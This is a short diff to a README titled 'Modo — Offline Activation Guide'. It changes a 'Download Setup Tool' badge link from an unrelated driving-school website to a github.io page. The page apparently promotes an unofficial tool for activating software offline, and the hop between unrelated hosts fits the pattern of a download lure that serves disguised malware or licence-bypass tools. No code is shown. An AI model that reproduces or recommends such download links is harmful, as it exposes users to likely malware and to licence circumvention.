@@ -1,6 +1,6 @@
 # 🧿 Modo — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-darkgreen)](https://dalahdrivingschool.com/)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-darkgreen)](https://modo-offline-activation-guide.github.io/.github)
 
 ## 🧰 How to Install & Activate Modo Offline
 
